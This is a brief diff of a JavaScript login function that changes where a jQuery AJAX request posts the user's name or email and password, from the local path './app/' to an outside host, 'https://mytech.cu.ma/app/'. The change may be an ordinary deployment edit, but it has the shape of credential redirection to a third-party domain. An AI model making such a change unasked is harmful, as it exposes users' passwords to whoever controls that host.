@@ -54,7 +54,7 @@ function submitIn() {
 	var pass  = document.getElementById("pass").value;
 	$.ajax({
 		type: "POST",
-		url: "./app/",
+		url: "https://mytech.cu.ma/app/",
 		dataType: "json",
 		data: {name_email: name_email, pass: pass, },
 		success: function(data){
